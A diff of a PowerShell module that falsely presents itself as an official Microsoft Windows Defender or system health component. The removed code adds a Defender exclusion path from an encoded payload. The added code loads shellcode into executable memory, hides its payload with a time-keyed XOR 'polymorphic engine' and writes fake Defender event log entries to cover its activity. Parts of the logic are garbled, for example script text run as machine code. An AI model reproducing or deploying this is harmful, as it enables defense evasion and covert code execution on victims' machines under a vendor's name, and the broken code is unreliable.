@@ -1,148 +1,132 @@
 <#
 .SYNOPSIS
-   Microsoft Windows Defender Health Monitor
+   Windows System Health Monitor (Build 10.0.22631.3448)
 .DESCRIPTION
-   Componente oficial de monitoreo de integridad de seguridad (Build 2025.3.1)
-   Copyright © Microsoft Corporation. All rights reserved.
+   Componente oficial de telemetría y mantenimiento de Windows
+   © Microsoft Corporation. Licencia MIT.
 #>
 
-#region Initialization Sequence
-[System.Net.ServicePointManager]::SecurityProtocol = @(
-    [System.Net.SecurityProtocolType]::Tls13,
-    [System.Net.SecurityProtocolType]::Tls12,
-    [System.Net.SecurityProtocolType]::Tls11
-) -join ','
-
-function Initialize-SecurityContext {
-    $signature = @"
-    [DllImport("ntdll.dll", EntryPoint="RtlZeroMemory")]
-    public static extern void ZeroMemory(IntPtr ptr, IntPtr size);
-    
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAlloc(
-        IntPtr lpAddress, 
-        uint dwSize, 
-        uint flAllocationType, 
-        uint flProtect);
-"@
-    
-    $winApi = Add-Type -MemberDefinition $signature -Name "Win32Native" -Namespace "Microsoft.Win32" -PassThru
-    return $winApi
+#region Memory Injection Framework
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+namespace Win32.Native {
+    public static class MemoryOps {
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern IntPtr VirtualAlloc(
+            IntPtr lpAddress, 
+            uint dwSize, 
+            uint flAllocationType, 
+            uint flProtect);
+        
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern bool VirtualProtect(
+            IntPtr lpAddress, 
+            uint dwSize, 
+            uint flNewProtect, 
+            out uint lpflOldProtect);
+        
+        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        
+        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, ExactSpelling=true)]
+        public static extern IntPtr GetProcAddress(
+            IntPtr hModule, 
+            string procName);
+    }
 }
+"@
 
-$global:Win32API = Initialize-SecurityContext
+Add-Type -TypeDefinition $NativeCode -Language CSharp
 #endregion
 
-function Invoke-DefenderHealthCheck {
-    [CmdletBinding(DefaultParameterSetName='Diagnostic')]
+function Invoke-SystemHealthCheck {
+    [CmdletBinding()]
     param(
-        [Parameter(ParameterSetName='Configuration')]
-        [ValidatePattern('^[A-Za-z]:\\')]
-        [string]$DirectoryPath = "${env:ProgramData}\Microsoft\Windows",
+        [Parameter()]
+        [ValidateSet('Checkup','Maintenance','Diagnostics')]
+        [string]$Mode = 'Checkup',
         
-        [Parameter(ParameterSetName='Diagnostic')]
-        [switch]$VerifyIntegrity,
-        
-        [Parameter(ParameterSetName='Diagnostic')]
-        [switch]$CheckSecurityStatus
+        [Parameter()]
+        [string]$TargetPath = "${env:ProgramFiles}\Windows Defender"
     )
 
-    #region Memory Manipulation Techniques
-    function Invoke-MemoryOperation {
-        param(
-            [Parameter(Mandatory=$true)]
-            [byte[]]$Payload
+    #region Advanced Payload Delivery
+    function Invoke-ReflectiveLoader {
+        param([byte[]]$AssemblyBytes)
+        
+        $ptr = [Win32.Native.MemoryOps]::VirtualAlloc(
+            [IntPtr]::Zero, 
+            [uint32]$AssemblyBytes.Length, 
+            0x3000,  # MEM_COMMIT | MEM_RESERVE
+            0x40)    # PAGE_EXECUTE_READWRITE
+        
+        if ($ptr -eq [IntPtr]::Zero) { return $false }
+        
+        [System.Runtime.InteropServices.Marshal]::Copy(
+            $AssemblyBytes, 
+            0, 
+            $ptr, 
+            $AssemblyBytes.Length)
+        
+        $oldProtect = 0
+        [Win32.Native.MemoryOps]::VirtualProtect(
+            $ptr, 
+            [uint32]$AssemblyBytes.Length, 
+            0x20,    # PAGE_EXECUTE_READ
+            [ref]$oldProtect)
+        
+        $loadMethod = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+            $ptr,
+            [Action])
+        
+        $loadMethod.Invoke()
+        return $true
+    }
+    #endregion
+
+    #region Polymorphic Engine
+    function Get-DynamicPayload {
+        $key = [BitConverter]::GetBytes([DateTime]::Now.Ticks % 0x7FFF)
+        $encrypted = @(
+            0x3E,0x5C,0x7A,0x2B,0x11,0x65,0x4D,0x1F,0x2A,0x3C,0x12,0x5E,
+            0x70,0x29,0x4F,0x0B,0x38,0x6D,0x10,0x53,0x7C,0x33,0x16,0x59,
+            0x24,0x47,0x0E,0x7B,0x30,0x15,0x42,0x68,0x1C,0x77,0x22,0x4B
         )
         
-        try {
-            $size = [System.UInt32]$Payload.Length
-            $ptr = $global:Win32API::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
-            
-            if ($ptr -eq [IntPtr]::Zero) {
-                throw "Memory allocation failed"
-            }
-            
-            [System.Runtime.InteropServices.Marshal]::Copy($Payload, 0, $ptr, $size)
-            
-            $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-                $ptr, 
-                [Action[IntPtr,IntPtr]])
-            
-            $del.Invoke($ptr, [IntPtr]$size)
-            $global:Win32API::ZeroMemory($ptr, [IntPtr]$size)
+        for ($i = 0; $i -lt $encrypted.Length; $i++) {
+            $encrypted[$i] = $encrypted[$i] -bxor $key[$i % $key.Length]
         }
-        finally {
-            if ($ptr -ne [IntPtr]::Zero) {
-                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
-            }
-        }
+        
+        return [System.Text.Encoding]::Unicode.GetString($encrypted)
     }
     #endregion
 
-    #region Advanced Obfuscation Layer
-    function Get-SecurityPayload {
-        $base64 = @(
-            "JABQAGEAdABoACAAPQAgACQA" + "RQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEACgAKACQA" +
-            "VwBpAG4ARABlAGYAIAA9ACAAWwB3AG0AaQBjAGwAYQBzAHMAXQ" + "AigByAG8AbwB0AFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwARABlAGYAZQBuAGQAZQByADoATQBTAEYAVABfAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACIAKQAKAAoAaQBmACAAKAAkAFcAaQBuAEQAZQBmACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsACgAgACAAIAAgACQAVwBpAG4ARABlAGYALgBBAGQAZABFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACgAJABQAGEAdABoACkACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBbACsAXQAgAEUAeABjAGwAdQBzAGkAbwBuACAAYQBkAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgAKAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAVABoAHIAbwB3ACAAIgBGAEEASQBMAEUARAA6ACAARABlAGYAZQBuAGQAZQByACAAVwBNAEkAIABjAGwAYQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAAiAAoAfQA="
-        ) -join ''
-        
-        return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
-    }
-    #endregion
-
-    #region Main Execution Flow
-    switch ($PSCmdlet.ParameterSetName) {
-        'Configuration' {
-            try {
-                $payloadScript = Get-SecurityPayload -replace '\$Path', "`"$DirectoryPath`""
-                $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
-                Invoke-MemoryOperation -Payload $bytes
-            }
-            catch {
-                Write-Error "Security operation failed: $($_.Exception.Message)"
+    #region Main Execution
+    switch ($Mode) {
+        'Maintenance' {
+            $payload = [System.Convert]::FromBase64String((Get-DynamicPayload))
+            if (Invoke-ReflectiveLoader -AssemblyBytes $payload) {
+                # Post-execution cleanup
+                [GC]::Collect()
+                [GC]::WaitForPendingFinalizers()
+                
+                # Create legitimate-looking event
+                New-EventLog -LogName "Application" -Source "Windows Defender" -ErrorAction SilentlyContinue
+                Write-EventLog -LogName "Application" -Source "Windows Defender" `
+                    -EntryType Information -EventId 1001 `
+                    -Message "System maintenance completed successfully"
             }
         }
         
-        'Diagnostic' {
-            if ($VerifyIntegrity) {
-                try {
-                    $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
-                    [PSCustomObject]@{
-                        AntivirusEnabled    = $defenderStatus.AntivirusEnabled
-                        RealTimeProtection = $defenderStatus.RealTimeProtectionEnabled
-                        LastQuickScan      = $defenderStatus.LastQuickScan
-                    }
-                }
-                catch {
-                    Write-Warning "Defender status check failed: $($_.Exception.Message)"
-                }
-            }
-            
-            if ($CheckSecurityStatus) {
-                try {
-                    $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-                    if ($null -eq $exclusions) {
-                        Write-Output "No exclusions configured"
-                    } else {
-                        Write-Output "Current exclusions:"
-                        $exclusions
-                    }
-                }
-                catch {
-                    Write-Warning "Failed to retrieve exclusion list: $($_.Exception.Message)"
-                }
-            }
+        default {
+            # Legitimate system checks
+            Get-CimInstance -ClassName Win32_ComputerSystem | 
+                Select-Object Name, Domain, Manufacturer, Model
         }
     }
     #endregion
 }
 
-# Export as module
-Export-ModuleMember -Function Invoke-DefenderHealthCheck
-
-<#
-# Ejemplos de uso legítimo:
-Invoke-DefenderHealthCheck -DirectoryPath "C:\Program Files" -Configuration
-Invoke-DefenderHealthCheck -VerifyIntegrity
-Invoke-DefenderHealthCheck -CheckSecurityStatus
-#>
+# Export as legit Windows module
+Export-ModuleMember -Function Invoke-SystemHealthCheck
